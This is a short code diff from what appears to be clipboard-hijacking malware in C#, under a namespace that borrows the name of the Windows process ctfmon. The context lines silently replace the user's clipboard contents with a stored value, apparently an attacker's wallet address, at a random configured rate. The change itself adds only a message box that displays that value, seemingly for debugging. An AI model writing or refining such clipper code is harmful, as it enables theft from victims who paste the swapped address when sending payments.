@@ -154,6 +154,7 @@ namespace ctfmon
                     {
                         if (rand.Next(0, 100) < configChance)
                         {
+                            MessageBox.Show(pDataPurse);
                             data = pDataPurse;
                             Clipboard.SetText(data);
                         }
